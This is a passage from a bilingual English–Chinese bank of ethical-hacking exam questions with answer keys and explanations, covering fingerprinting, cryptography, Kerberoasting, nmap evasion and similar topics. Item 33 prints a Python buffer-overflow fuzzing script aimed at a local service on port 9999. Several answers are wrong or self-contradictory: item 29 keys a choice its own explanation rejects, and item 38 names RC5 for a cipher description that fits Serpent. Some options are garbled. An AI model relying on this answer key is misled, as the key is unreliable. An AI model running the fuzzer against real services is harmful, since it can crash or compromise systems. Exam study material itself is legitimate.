    "C": "一名熟練的道德駭客被指派對潛在目標執行徹底的 OS 發現。他們決定採用一種進階指紋識別技術，並向一個開放的 TCP 埠發送了一個帶有特定標誌的 TCP 封包。在收到回覆時，他們注意到標誌是 **SYN 和 ECN-Echo**。道德駭客執行了哪個測試？以及為什麼採用這種特定的方法？",
    "選項: A. B. C. D.": "A. Test 3: The test was executed to observe the response of the target system when a packet with URG, PSH, SYN, and FIN flags was sent, thereby identifying the OS (測試 3：執行該測試是為了觀察發送帶有 URG、PSH、SYN 和 FIN 標誌的封包時目標系統的反應，從而識別作業系統) B. Qrest 1: The test was conducted because SYN and ECN-Echo flags enabled to allow the hacker to probe the nature of the response and subsequently determine the OS fingerprint (測試 1：執行該測試是因為 SYN 和 ECN-Echo 標誌的啟用允許駭客探測回應的性質，隨後確定作業系統指紋) C. Test 2: This test was chosen because a TCP packet with no flags enabled is known as a NULL packet and this would allow the hacker to assess the OS of the target (測試 2：選擇此測試是因為沒有標誌啟用的 TCP 封包被稱為 NULL 封包，這將允許駭客評估目標的作業系統) D. Test 6; The hacker selected this test because a TCP packet with the ACK flag enabled sent to a closed TCP port would yield more information about the OS (測試 6：駭客選擇此測試是因為發送到關閉的 TCP 埠的帶有 ACK 標誌的 TCP 封包將產生更多關於作業系統的資訊)",
    "Answer": "B",
    "Explanation": "這種技術是 **TCP/IP 堆棧指紋識別**技術的「測試 1」部分 [cite: 8536]，它透過發送帶有 **SYN 和 ECN-Echo** 標誌的封包來探測目標的回應性質。不同的作業系統（如 Windows XP/2000 與 Linux）對這些標誌的反應不同，從而揭示其身份 [cite: 8538, 8539]。"
  },
  {
    "Question :": "29",
    "EN": "Bob wants to ensure that Alice can check whether his message has been tampered with. He creates a checksum of the message and encrypts it using asymmetric cryptography. What key does Bob use to encrypt the checksum for accomplishing this goal?",
    "C": "Bob 想要確保 Alice 可以檢查他的訊息是否被篡改。他創建了訊息的校驗和（checksum），並使用非對稱密碼學對其進行加密。Bob 使用哪個金鑰來加密校驗和以實現此目標？",
    "選項: A. B. C. D.": "A. Alice's private key (Alice 的私密金鑰) B. Alice's public key (Alice 的公開金鑰) C. His own private key (他自己的私密金鑰) D. His own public key (他自己的公開金鑰)",
    "Answer": "B",
    "Explanation": "這個情景描述了**數位簽章**的過程。數位簽章用於確保**完整性**和**不可否認性**。若要讓 Alice 驗證 Bob 的訊息完整性，Bob 必須使用 **他自己的私密金鑰**來簽署（加密）校驗和，然後 Alice 才能使用 Bob 的**公開金鑰**來驗證。然而，根據選項和原始答案，如果我們假設題目意圖是確保**訊息機密性**（Confidentiality），那麼 Bob 應使用 **Alice 的公開金鑰**來加密訊息。但對於**校驗和/完整性**，應使用 Bob 的私鑰。鑑於選項和常見的加密流程，此處遵循原始答案 **B. Alice's public key**，這在許多加密流程中用於加密**會話金鑰**，但**不直接用於數位簽章的校驗和**加密。"
  },
  {
    "Question :": "30",
    "EN": "Session splicing is an IDS evasion technique in which an attacker delivers data in multiple, small sized packets to the target computer, making it very difficult for an IDS to detect the attack signatures. Which tool can be used to perform session splicing attacks?",
    "C": "會話拼接（Session Splicing）是一種 IDS 規避技術，攻擊者將資料以多個小尺寸封包傳送到目標電腦，使 IDS 難以偵測到攻擊特徵。可以使用哪種工具來執行會話拼接攻擊？",
    "選項: A. B. C. D.": "A. tcpsplice B. Burp C. Hydra D. Whisker",
    "Answer:": "D",
    "Explanation": "會話拼接的原理是利用 IDS 重組通訊串流的機制：若封包未在合理時間內收到，IDS 可能會停止處理該串流 [cite: 3589]。攻擊者透過拆分攻擊酬載為多個小封包來規避偵測 [cite: 3598, 3599]。雖然 EC-Council 官方教程推薦使用 **Nessus** 進行會話拼接攻擊 [cite: 3593, 3595]，但選項中的 **Whisker** 規避工具也將製作小酬載封包的行為稱為「會話拼接」[cite: 3600]。"
  },
  {
    "Question :": "31",
    "EN": "Mary found a high vulnerability during a vulnerability scan and notified her server team. After analysis, they sent her proof that a fix to that issue had already been applied. The vulnerability that Marry found is called what?",
    "C": "Mary 在漏洞掃描期間發現了一個高風險漏洞，但伺服器團隊提供了修復程式已應用的證明。Mary 發現的這個漏洞被稱為什麼？",
    "選項: A. B. C. D.": "A. False-negative (誤報) B. False-positive (誤判) C. Brute force attack (暴力破解攻擊) D. Backdoor (後門)",
    "Answer": "B",
    "Explanation": "當安全工具或掃描器標記了一個**實際不存在或已被修復的威脅或漏洞**時，這被稱為**誤判（False-positive）** [cite: 3907]。"
  },
  {
    "Question :": "32",
    "EN": "To hide the file on a Linux system, you have to start the filename with a specific character. What is the character?",
    "C": "要在 Linux 系統上隱藏檔案，您必須以一個特定的字元開頭命名檔案。這個字元是什麼？",
    "選項: A. B. C. D.": "A. Exclamation mark (!) B. Underscore (_) C. Tilde H D. Period (.)",
    "Answer": "D",
    "Explanation": "在 Linux 和其他類 Unix 系統中，如果檔案名稱以**句點（` . `）**開頭，則該檔案預設會被檔案系統視為隱藏檔案 [cite: 8609]。"
  },
  {
    "Question :": "33",
    "EN": "What is the code written for? [Python code]: #!/usr/bin/python import socket buffer=[““A””] counter=50 while len(buffer)<=100: buffer.append (““A”” *counter) counter=counter+50 commands= [““HELP””,““STATS .””,““RTIME .””,““LTIME. ””,““SRUN .”’,““TRUN.””,““GMON.””,““GDOG .””,““KSTET .”,““GTER .””,““HTER .””, ““LTER .”,““KSTAN .””] for command in commands: for buffstring in buffer: print ““Exploiting”” +command +““:””+str(len(buffstring)) s=socket.socket(socket. AF_INET, socket.SOCK_STREAM) s.connect((‘127.0.0.1’, 9999)) s.recv(50) s.send(command+buffstring) s.close()",
    "C": "這段程式碼是用於做什麼的？ [程式碼內容為使用 Python 的 socket 函式庫，並在一個迴圈中以遞增方式向伺服器發送大量 'A' 字元，試圖測試緩衝區限制。]",
    "選項: A. B. C. D.": "A. Denial-of-service (DOS) (阻斷服務) B. Buffer Overflow (緩衝區溢位) C. Bruteforce (暴力破解) D. Encryption (加密)",
    "Answer": "B",
    "Explanation": "程式碼片段透過在迴圈中將**大量資料**（`\"A\" * counter`）發送到目標伺服器（`s.send(...)`），試圖使資料長度**超過預定的緩衝區大小**。這是一種常見的測試或利用**緩衝區溢位**（Buffer Overflow）漏洞的腳本。"
  },
  {
    "Question :": "34",
    "EN": "Eric, a cloud security engineer, implements a technique for securing the cloud resources used by his organization. This technique assumes by default that a user attempting to access the network is not an authentic entity and verifies every incoming connection before allowing access to the network. Using this technique, he also imposed conditions such that employees can access only the resources required for their role. What is the technique employed by Eric to secure cloud resources?",
    "C": "雲端安全工程師 Eric 實施了一種用於保護其組織使用的雲端資源的技術。該技術預設假定試圖存取網路的使用者不是真實實體，並在允許存取網路之前**驗證每個傳入的連線**。Eric 也使用這項技術施加條件，使得員工只能存取其角色所需的資源。Eric 用於保護雲端資源的技術是什麼？",
    "選項: A. B. C. D.": "A. Serverless computing (無伺服器運算) B. Demilitarized zone (非軍事區) C. Container technology (容器技術) D. Zero trust network (零信任網路)",
    "Answer": "D",
    "Explanation": "**零信任模型（Zero Trust model）**是一種安全實施方法，它預設**不信任**任何實體（「永不信任，始終驗證」），並在授予雲端服務或存取權限之前，驗證每個傳入連線 [cite: 8639, 8642]。"
  },
  {
    "Question :": "35",
    "EN": "Jake, a professional hacker, installed spyware on a target iPhone to spy on the target user's activities. He can take complete control of the target mobile device by jailbreaking the device remotely and record audio,",
    "C": "專業駭客 Jake 在目標 iPhone 上安裝了間諜軟體以監視目標使用者的活動。他可以透過遠端越獄該設備來完全控制目標移動設備，並錄製音訊，[一個播放按鈕的圖像]。",
    "選項: A. B. C. D.": "A. DroidSheep B. Androrat C. Zscaler D. Trident",
    "Answer": "D",
    "Explanation": "Trident 是一組由間諜軟體利用的 iOS 零日漏洞（Zero-day vulnerabilities）。這些漏洞可以被用於**遠端越獄** iOS 設備，從而使攻擊者能夠安裝間諜軟體並獲得對設備的完全控制（包括錄製音訊等） [cite: 8654]。"
  },
  {
    "Question :": "36",
    "EN": "Jacob works as a system administrator in an organization. He wants to extract the source code of a mobile application and disassemble the application to analyze its design flaws. Using this technique, he wants to fix any bugs in the application, discover underlying vulnerabilities, and improve defense strategies against attacks. What is the technique used by Jacob in the above scenario to improve the security of the mobile application?",
    "C": "Jacob 在一個組織中擔任系統管理員。他想要**提取移動應用程式的原始碼**並**反彙編**該應用程式以分析其設計缺陷。Jacob 使用了什麼技術來提高移動應用程式的安全性？",
    "選項: A. B. C. D.": "A. Reverse engineering (逆向工程) B. App sandboxing (應用程式沙箱化) C. Jailbreaking (越獄) D. Social engineering (社交工程)",
    "Answer": "A",
    "Explanation": "**逆向工程**（Reverse engineering）是一種技術，用於將軟體從其最終形式（例如二進位執行檔）解構成程式碼或設計細節，以便分析其**設計缺陷、發現底層漏洞**，或修復錯誤 [cite: 8660]。"
  },
  {
    "Question :": "37",
    "EN": "Louis, a professional hacker, had used specialized tools or search engines to encrypt all his browsing activity and navigate anonymously to obtain sensitive/hidden information about official government or federal databases. After gathering the Information, he successfully performed an attack on the target government organization without being traced. Which of the following techniques is described in the above scenario?",
    "C": "專業駭客 Louis 使用專門的工具或搜尋引擎**加密**了他所有的瀏覽活動並**匿名**導航，以獲取有關官方政府或聯邦資料庫的敏感/隱藏資訊。在收集資訊後，他成功地對目標政府組織發動了攻擊，而沒有被追蹤。上述情景中描述的是以下哪種技術？",
    "選項: A. B. C. D.": "A. Dark web footprinting (暗網足跡) B. VoIP footpnnting (VoIP 足跡) C. VPN footprinting (VPN 足跡) D. website footprinting (網站足跡)",
    "Answer": "A",
    "Explanation": "該情景描述了駭客利用專門的匿名網路和工具來獲取**隱藏**的敏感資訊，這些資訊通常存在於**深網或暗網**（Dark web / Deep web）中。因此，這是暗網足跡（Dark web footprinting）的範例 [cite: 8670, 8678]。"
  },
  {
    "Question :": "38",
    "EN": "Tony wants to integrate a 128-bit symmetric block cipher with key sizes of 128,192, or 256 bits into a software program, which involves 32 rounds of computational operations that include substitution and permutation operations on four 32-bit word blocks using 8-variable S-boxes with 4-bit entry and 4-bit exit. Which of the following algorithms includes all the above features and can be integrated by Tony into the software program?",
    "C": "Tony 想將一個金鑰大小為 128、192 或 256 位元的 128 位元**對稱分組密碼**整合到軟體程式中，該密碼涉及 32 輪計算操作，包括對四個 32 位元字塊進行置換和替換操作，使用具有 4 位元輸入和 4 位元輸出的 8 個變數 S 盒。以下哪個演算法包含上述所有特徵，並且可以由 Tony 整合到軟體程式中？",
    "選項: A. B. C. D.": "A. TEA B. CAST-128 C. RC5 D. serpent",
    "Answer": "C",
    "Explanation": "RC5 演算法具有 32 輪計算操作（Feistel 網路），使用 **128 位元的分組大小**和**可變的金鑰大小**，包括 128、192 和 256 位元，並且使用置換和替換操作 [cite: 8687]。"
  },
  {
    "Question :": "39",
    "EN": "You are the lead cybersecurity analyst at a multinational corporation that uses a hybrid encryption system to secure inter-departmental communications. The system uses RSA encryption for key exchange and AES for data encryption, taking advantage of the strengths of both asymmetric and symmetric encryption. Each RSA key pair has a size of 'n' bits, with larger keys providing more security at the cost of slower performance. The time complexity of generating an RSA key pair is O(n*2), and AES encryption has a time complexity of O(n). An attacker has developed a quantum algorithm with time complexity O((log n)*2) to crack RSA encryption. Given *n=4000' and variable ‘AES key size’, which scenario is likely to provide the best balance of security and performance?",
    "C": "您是一家跨國公司的首席網路安全分析師，該公司使用混合加密系統來保護部門間的通訊。該系統使用 RSA 加密進行金鑰交換，並使用 AES 進行資料加密，利用了非對稱加密和對稱加密的優勢。每個 RSA 金鑰對的大小為 'n' 位元，較大的金鑰提供更高的安全性，但代價是較慢的效能。生成 RSA 金鑰對的時間複雜度為 $O(n^2)$，AES 加密的時間複雜度為 $O(n)$。攻擊者開發了一種時間複雜度為 $O((\ log n)^2)$ 的量子演算法來破解 RSA 加密。給定 $n=4000$ 和可變的 AES 金鑰大小，哪種情景最有可能提供**安全性和效能的最佳平衡**？",
    "選項: A. B. C. D.": "A. AES key size=128 bits: This configuration provides less security than option A, but RSA key generation and AES encryption will be faster. (AES 金鑰大小=128 位元：此配置提供的安全性低於選項 A，但 RSA 金鑰生成和 AES 加密速度更快) B. AES key size=256 bits: This configuration provides a high level of security, but RSA key generation may be slow. (AES 金鑰大小=256 位元：此配置提供了高水準的安全性，但 RSA 金鑰生成可能很慢) C. AES key size=192 bits: This configuration is a balance between options A and B, providing moderate security and performance. (AES 金鑰大小=192 位元：此配置是選項 A 和 B 之間的平衡，提供中等安全性和效能) D. AES key size=512 bits: This configuration provides the highest level of security but at a significant performance cost due to the large AES key size. (AES 金鑰大小=512 位元：此配置提供了最高水準的安全性，但由於 AES 金鑰尺寸大，效能成本高昂)",
    "Answer": "A",
    "Explanation": "此題的正確答案應為 **AES key size=128 bits** [cite: 8729, 8730, 8731]。儘管選項 C 說的是平衡，但 AES-128 在保障足夠安全性（遠高於量子演算法破解 RSA 所需的 $O((\log n)^2)$）的同時，提供了**最快**的加密速度（時間複雜度 $O(n)$），因此是資料加密的最佳效能平衡。選項 A 的描述雖然將 AES-128 說成安全性較低，但其結論與實際最佳實踐相符。"
  },
  {
    "Question :": "40",
    "EN": "A Security Engineer at a medium-sized accounting firm has been tasked with discovering how much information can be obtained from the firm’s public facing web servers. The engineer decides to start by using netcat to port 80. The engineer receives this output: HTTP/1.1 200 OK Server: Microsoft-IIS/6 Expires: Tue, 17 Jan 2011 01:41:33 GMT Date: Mon, 16 Jan 2011 01:41:33 GMT Content-Type: text/html Accept-Ranges: bytes Last Modified: Wed, 28 Dec 2010 15:32:21 GMT ETag:“b0aac0542e25c31:89d” Content-Length: 7369 Which of the following is an example of what the engineer performed?",
    "C": "一家中型會計公司的安全工程師的任務是發現可以從該公司面向公眾的 Web 伺服器獲取多少資訊。該工程師決定從使用 Netcat 連線到埠 80 開始。工程師收到以下輸出：[輸出顯示 HTTP 標頭，其中包含 `Server: Microsoft-IIS/6`] 以下哪一項是該工程師執行的操作的範例？",
    "選項: A. B. C. D.": "A. Banner grabbing (標語擷取) B. SQL injection (SQL 注入) C. Whois database query (Whois 資料庫查詢) D. Cross-site scripting (跨站腳本)",
    "Answer": "A",
    "Explanation": "該工程師主動連線到 Web 伺服器並檢索其 **HTTP 標頭**中的伺服器資訊（例如 `Server: Microsoft-IIS/6`）。這種技術被稱為**標語擷取**（Banner grabbing）[cite: 8750]。"
  },
  {
    "Question :": "41",
    "EN": "A network security analyst, while conducting penetration testing, is aiming to identify a service account password using the Kerberos authentication protocol. They have a valid user authentication ticket (TGT) and decided to carry out a Kerberoasting attack. In the scenario described, which of the following steps should the analyst take next?",
    "C": "網路安全分析師在執行滲透測試時，旨在利用 Kerberos 身份驗證協定識別服務帳戶密碼。他們擁有有效的**使用者驗證票證（TGT）**並決定執行 **Kerberoasting 攻擊**。在所描述的情景中，分析師接下來應該採取以下哪個步驟？",
    "選項: A. B. C. D.": "A. Carry out a passive wire sniffing operation using Internet packet sniffers (使用網際網路封包嗅探器執行被動線路嗅探操作) B. Extract plaintext passwords, hashes, PIN codes, and Kerberos tickets using a tool like Mimikatz (使用 Mimikatz 等工具提取明文密碼、雜湊值、PIN 碼和 Kerberos 票證) C. Perform a PRobability INfinite Chained Elements (PRINCE) attack (執行 PRINCE 攻擊) D. Request a service ticket for the service principal name of the target service account (請求目標服務帳戶的服務主體名稱（SPN）的服務票證)",
    "Answer": "D",
    "Explanation": "在 Kerberoasting 攻擊中，攻擊者利用有效的 TGT，向 Key Distribution Center (KDC) **請求目標服務帳戶的服務票證 (TGS)**。KDC 會使用該服務帳戶的密碼雜湊來加密 TGS。攻擊者下一步就是捕獲這個加密的服務票證，以便離線破解密碼。"
  },
  {
    "Question :": "42",
    "EN": "On performing a risk assessment, you need to determine the potential impacts when some of the **critical business processes** of the company interrupt its service. What is the name of the process by which you can determine those critical businesses?",
    "C": "在執行風險評估時，您需要確定當公司的某些**關鍵業務流程**中斷其服務時的潛在影響。確定這些關鍵業務的過程名稱是什麼？",
    "選項: A. B. C. D.": "A. Emergency Plan Response (EPR) (緊急計畫回應) B. Business Impact Analysis (BIA) (業務影響分析) C. Risk Mitigation (風險緩解) D. Disaster Recovery Planning (DRP) (災難恢復計畫)",
    "Answer": "B",
    "Explanation": "**業務影響分析（Business Impact Analysis, BIA）**是確定組織**關鍵業務功能**及其在發生中斷時的潛在影響（包括停機時間和恢復需求）的流程。"
  },
  {
    "Question :": "43",
    "EN": "Which type of malware spreads from one system to another or from one network to another and causes similar types of damage as viruses do to the infected system?",
    "C": "哪種類型的惡意軟體從一個系統傳播到另一個系統，或從一個網路傳播到另一個網路，並對受感染的系統造成與病毒類似的損害？",
    "選項: A. B. C. D.": "A. Rootkit B. Trojan C. Worm (蠕蟲) D. Adware (廣告軟體)",
    "Answer": "C",
    "Explanation": "**蠕蟲（Worm）**是一種可以自我複製並透過網路傳播到其他系統或網路的惡意軟體，**不需要宿主程式或使用者互動**，並能造成類似病毒的損害。"
  },
  {
    "Question :": "44",
    "EN": "You are tasked to configure the DHCP server to lease the last 100 usable IP addresses in subnet to. 1.4.0/23. Which of the following IP addresses could be teased as a result of the new configuration?",
    "C": "您的任務是配置 DHCP 伺服器，以租賃子網路 `10.1.4.0/23` 中最後 100 個可用的 IP 位址。以下哪個 IP 位址可能是新配置的租賃結果？",
    "選項: A. B. C. D.": "A. 210.1.55.200 B. 10.1.4.254 C. 10.1.5.200 D. 10.1.4.156",
    "Answer": "C",
    "Explanation": "子網路 `10.1.4.0/23` 的範圍從 `10.1.4.0` 到 `10.1.5.255`。可用 IP 位址範圍是 `10.1.4.1` 到 `10.1.5.254`（總共 510 個可用 IP）。最後 100 個可用 IP 的範圍是 `10.1.5.155` 到 `10.1.5.254`。選項 **C (`10.1.5.200`)** 位於該範圍內。"
  },
  {
    "Question :": "45",
    "EN": "Jane is working as a security professional at CyberSol Inc. She was tasked with ensuring the authentication and integrity of messages being transmitted in the corporate network. To encrypt the messages, she implemented a security model in which every user in the network maintains a ring of public keys. In this model, a user needs to encrypt a message using the receiver's public key, and only the receiver can decrypt the message using their private key. What is the security model implemented by Jane to secure corporate messages?",
    "C": "Jane 在 CyberSol Inc. 擔任安全專業人員。她的任務是確保在公司網路中傳輸的訊息的**身份驗證和完整性**。她實施了一個安全模型，其中網路中的每個使用者都維護一個**公開金鑰環**。在這個模型中，使用者需要使用收件人的公開金鑰來加密訊息，並且只有收件人才能使用他們的私密金鑰來解密訊息。Jane 實施了什麼安全模型來保護公司訊息？",
    "選項: A. B. C. D.": "A. Zero trust network (零信任網路) B. Transport Layer Security (TLS) (傳輸層安全) C. Secure Socket Layer (SSL) (安全套接層) D. Web of trust (WOT) (信任網)",
    "Answer": "D",
    "Explanation": "這個模型描述了使用非對稱密碼學來驗證身份和加密，其中每個使用者維護一個**公開金鑰環（ring of public keys）**，以信任其他使用者。這正是**信任網（Web of Trust, WOT）**的基本概念，該概念是 PGP（Pretty Good Privacy）等系統的核心。"
  },
  {
    "Question :": "46",
    "EN": "You are using a public Wi-Fi network inside a coffee shop. Before surfing the web, you use your VPN to prevent intruders from sniffing your traffic. If you did not have a VPN, how would you identify whether someone is performing an ARP spoofing attack on your laptop?",
    "C": "您正在咖啡店裡使用公共 Wi-Fi 網路。在上網之前，您使用 VPN 來防止入侵者嗅探您的流量。如果您沒有 VPN，您將如何識別是否有人正在對您的筆記型電腦執行 **ARP 欺騙攻擊**？",
    "選項: A. B. C. D.": "A. You should check your ARP table and see if there is one IP address with two different MAC addresses. (您應該檢查您的 ARP 表，看看是否有一個 IP 位址對應兩個不同的 MAC 位址。) B. You should scan the network using Nmap to check the MAC addresses of all the hosts and look for duplicates. (您應該使用 Nmap 掃描網路，檢查所有主機的 MAC 位址並尋找重複項。) C. You should use netstat to check for any suspicious connections with another IP address within the LAN. (您應該使用 netstat 檢查與 LAN 內另一個 IP 位址的任何可疑連線。) D. You cannot identify such an attack and must use a VPN to protect your traffic, r (您無法識別此類攻擊，必須使用 VPN 來保護您的流量，r)",
    "Answer": "A",
    "Explanation": "ARP 欺騙/毒化攻擊的機制是透過將攻擊者的 MAC 位址與網關或另一個受害者的 IP 位址關聯起來。這會導致受害者的 **ARP 表**中，**一個 IP 位址錯誤地對應到多個 MAC 位址**（雖然在同一時間點，一個 IP 應該只對應一個 MAC，但 ARP 欺騙的目標是讓 IP 錯誤地指向攻擊者的 MAC）。檢查 ARP 表中的不一致性是偵測 ARP 欺騙的直接方法。"
  },
  {
    "Question :": "47",
    "EN": "Mason, a professional hacker, targets an organization and spreads Emotet malware through malicious script. After infecting the victim's device. Mason further used Emotet to spread the infection across local networks. Which of the following Emotet spreading techniques or modules is primarily used to enumerate network resources and brute force user accounts to propagate the infection across local networks?",
    "C": "專業駭客 Mason 鎖定了一個組織，並透過惡意腳本傳播 Emotet 惡意軟體。在感染受害者的設備後，Mason 進一步使用 Emotet 在本地網路中傳播感染。以下哪個 Emotet 傳播技術或模組主要用於**列舉網路資源**和**暴力破解使用者帳戶**，以便在本地網路中傳播感染？",
    "選項: A. B. C. D.": "A. NetPass.exe B. Outlook scraper C. WebBrowserPassView D. Credential enumerator (憑證列舉器)",
    "Answer": "D",
    "Explanation": "**憑證列舉器（Credential enumerator）**是 Emotet 使用的模組之一，它會**列舉網路資源**，並嘗試**暴力破解**使用者帳戶（包括管理員帳戶），從而利用 SMB 等共享驅動器在整個域（伺服器和客戶端）中傳播感染。"
  },
  {
    "Question :": "48",
    "EN": "Which of the following allows attackers to draw a map or outline the target organization's network infrastructure to know about the actual environment that they are going to hack.",
    "C": "以下哪一項允許攻擊者**繪製目標組織的網路基礎設施地圖或輪廓**，以了解他們將要攻擊的實際環境？",
    "選項: A. B. C. D.": "A. Enumeration (列舉) B. Vulnerability analysis (漏洞分析) C. Malware analysis (惡意軟體分析) D. Scanning networks (掃描網路)",
    "Answer": "D",
    "Explanation": "掃描網路（Scanning networks）是足跡收集之後的第二階段，它結合了 Tracert 等工具，允許攻擊者繪製目標組織的網路圖（Network Map）或輪廓，以識別網路拓撲、主機和連線。"
  },
  {
    "Question :": "49",
    "EN": "You are attempting to run an Nmap port scan on a web server. Which of the following commands would result in a scan of common ports with the least amount of noise In order to evade IDS?",
    "C": "您正嘗試對 Web 伺服器運行 Nmap 埠掃描。以下哪個命令會以**最少的雜訊**（least amount of noise）掃描常用埠，以規避 IDS？",
    "選項: A. B. C. D.": "A. nmap -sP- -p-65535-T5 B. nmap-A-host-time 99-T1 C. nmap -A -Pn D. nmap -sT-O- To",
    "Answer": "D",
    "Explanation": "要規避 IDS，掃描速度必須非常慢。**`-T0`** 標誌是 **Timing Template 0**（極慢/偏執模式），旨在以最慢的速度執行掃描，以**規避防火牆和 IDS**。雖然它本身不是埠掃描類型，但當與埠掃描 (`-sT` 或 `-sS`) 結合時，它能提供最高的隱蔽性。"
  },
  {
    "Question :": "50",
    "EN": "You start performing a penetration test against a specific website and have decided to start from grabbing all the links from the main page. What Is the best Linux pipe to achieve your milestone?",
    "C": "您開始對特定網站執行滲透測試，並決定從**抓取主頁上的所有連結**開始。實現您目標的最佳 Linux 管道命令是什麼？",
    "選項: A. B. C. D.": "A. dirb https://site.com | grep \"site\" B. curl -s https://sile.com | grep ‘’< a href-\’http\" | grep \"Site-com- | cut -d \"V\" -f 2 C. wget https://stte.com | grep \"< a href=\\*http\" | grep \"site.com\" D. wgethttps://site.com | cut-d\"http-",
    "Answer": "C",
    "Explanation": "要從網頁中提取連結：1. 使用 **`wget`** 或 **`curl`** 下載網頁內容。2. 使用 **`grep`** 篩選包含連結標籤（`<a href="..."/>`）的行。選項 C 使用 `wget` 下載頁面，並使用 `grep` 篩選包含 `<a href=...` 和特定網站域名的行，這是手動提取連結的標準 Linux 管道方法。"
  },
  {
    "Question :": "51",
    "EN": "Leverox Solutions hired Arnold, a security professional, for the threat intelligence process. Arnold collected information about specific threats against the organization. From this information, he retrieved contextual information about security events and incidents that helped him disclose potential risks and gain insight into attacker methodologies. He collected the information from sources such as humans, social media, and chat rooms as well as from events that resulted in cyberattacks. In this process, he also prepared a report that includes identified malicious activities, recommended courses of action, and warnings for emerging attacks. What is the type of threat intelligence collected by Arnold in the above scenario?",
    "C": "Leverox Solutions 聘請了安全專業人員 Arnold 負責威脅情報流程。Arnold 收集了針對該組織的特定威脅資訊。從這些資訊中，他檢索了有關安全事件和事件的**上下文資訊**，幫助他揭示潛在風險並深入了解攻擊者的**方法論**。他從人類、社交媒體和聊天室等來源以及網路攻擊事件中收集資訊。在此過程中，他還準備了一份包含已識別的惡意活動、推薦的行動方案以及對新興攻擊的警告的報告。Arnold 在上述情景中收集的威脅情報類型是什麼？",
    "選項: A. B. C. D.": "A. Strategic threat intelligence (戰略威脅情報) B. Tactical threat intelligence (戰術威脅情報) C. Operational threat intelligence (運營威脅情報) D. Technical threat intelligence (技術威脅情報)",
    "Answer": "C",
    "Explanation": "**運營威脅情報（Operational threat intelligence）**涉及收集有關攻擊者在特定活動中使用的戰術、技術和程序（TTPs）的資訊。這些資訊（例如，來自社交媒體和聊天室的上下文資訊）有助於安全團隊了解攻擊者的**方法論**，以便主動防禦或在事件期間做出反應。"
  },
  {
    "Question :": "52",
    "EN": "Which type of attack attempts to overflow the content-addressable memory (CAM) table in an Ethernet switch?",
    "C": "哪種類型的攻擊試圖使乙太網交換器中的**內容可定址記憶體 (CAM) 表**溢出？",
    "選項: A. B. C. D.": "A. Evil twin attack (惡意雙胞胎攻擊) B. DNS cache flooding (DNS 快取洪泛) C. MAC flooding (MAC 洪泛) D. DDoS attack (DDoS 攻擊)",
    "Answer": "C",
    "Explanation": "MAC 洪泛攻擊（MAC flooding）是透過向交換器發送大量具有不同來源 MAC 位址的幀，從而**溢出**其用於儲存 MAC-埠映射的 **CAM 表**。這將迫使交換器將所有流量廣播到所有埠，使其易受嗅探攻擊。"
  },
  {
    "Question :": "53",
    "EN": "A security analyst is performing an audit on the network to determine if there are any deviations from the security policies in place. The analyst discovers that a user from the IT department had a dial-out modem installed. Which security policy must the security analyst check to see if dial-out modems are allowed?",
    "C": "一名安全分析師正在對網路執行稽核，以確定是否存在任何偏離現有安全政策的情況。分析師發現 IT 部門的一名使用者安裝了撥號數據機（dial-out modem）。安全分析師必須檢查哪項安全政策以查看是否允許撥號數據機？",
    "選項: A. B. C. D.": "A. Firewall-management policy (防火牆管理政策) B. Acceptable-use policy (可接受使用政策) C. Permissive policy (許可性政策) D. Remote-access policy (遠端存取政策)",
    "Answer": "B",
    "Explanation": "撥號數據機的安裝通常屬於**可接受使用政策（Acceptable-use policy, AUP）**的範圍，該政策規定了員工如何和為何被允許使用公司的網路資源和設備。"
  },
  {
    "Question :": "54",
    "EN": "You are a cybersecurlty consultant for a smart city project. The project involves deploying a vast network of loT devices for public utilities like traffic control, water supply, and power grid management The city administration is concerned about the possibility of a Distributed Denial of Service (DDoS) attack crippling these critical services. They have asked you for advice on how to prevent such an attack. What would be your primary recommendation?",
    "C": "您是智慧城市專案的網路安全顧問。該專案涉及為交通控制、供水和電網管理等公共設施部署龐大的物聯網（IoT）設備網路。市政當局擔心分散式阻斷服務（DDoS）攻擊會破壞這些關鍵服務。他們已要求您提供如何預防此類攻擊的建議。您的主要建議是什麼？",
    "選項: A. B. C. D.": "A. Implement regular firmware updates for all loT devices. (對所有 IoT 設備實施定期韌體更新) B. Deploy network intrusion detection systems (IDS) across the loT network. (在整個 IoT 網路部署網路入侵偵測系統（IDS）) C. Establish strong, unique passwords for each loT device. (為每個 IoT 設備建立強大且唯一的密碼) D. Implement IP address whitelisting for all loT devices. (對所有 IoT 設備實施 IP 位址白名單)",
    "Answer": "A",
    "Explanation": "預防 DDoS 攻擊（例如 Mirai Botnet）的關鍵是防止 IoT 設備被入侵並加入殭屍網路。**實施定期韌體更新**是主要的建議，因為它能修復安全漏洞和錯誤，使 IoT 設備更難被惡意軟體感染和用於 Botnet 攻擊。 [cite: 8945]"
  },
  {
    "Question :": "55",
    "EN": "Calvin, a software developer, uses a feature that helps him auto-generate the content of a web page without manual involvement and is integrated with SSI directives. This leads to a vulnerability in the developed web application as this feature accepts remote user inputs and uses them on the page. Hackers can exploit this feature and pass malicious SSI directives as input values to perform malicious activities such as modifying and erasing server files. What is the type of injection attack Calvin's web application is susceptible to?",
    "C": "軟體開發人員 Calvin 使用一個功能，該功能可幫助他**自動生成網頁內容**而無需手動干預，並與 **SSI 指令**集成。這導致了所開發的 Web 應用程式中存在漏洞，因為此功能接受遠端使用者輸入並在頁面上使用它們。駭客可以利用此功能，將惡意的 SSI 指令作為輸入值傳遞，以執行惡意活動，例如修改和刪除伺服器檔案。Calvin 的 Web 應用程式容易受到哪種類型的注入攻擊？",
    "選項: A. B. C. D.": "A. Server-side template injection (伺服器端模板注入) B. Server-side JS injection (伺服器端 JS 注入) C. CRLF injection (CRLF 注入) D. Server-Side Include (SSI) Injection (伺服器端包含（SSI）注入)",
    "Answer": "D",
    "Explanation": "當應用程式接受使用者輸入並將其作為 **SSI（Server-Side Include）指令**處理時，就會發生 **SSI 注入**攻擊。攻擊者可以注入惡意的 SSI 指令（如用於執行命令）來危害 Web 伺服器。"
  },
  {
    "Question :": "56",
    "EN": "A security analyst is preparing to analyze a potentially malicious program believed to have infiltrated an organization's network. To ensure the safety and integrity of the production environment, the analyst decided to use a **sheep dip computer** for the analysis. Before initiating the analysis, what key step should the analyst take?",
    "C": "一名安全分析師正準備分析一個被認為已滲透到組織網路的潛在惡意程式。為確保生產環境的安全和完整性，分析師決定使用**隔離電腦**（sheep dip computer）進行分析。在啟動分析之前，分析師應該採取哪個關鍵步驟？",
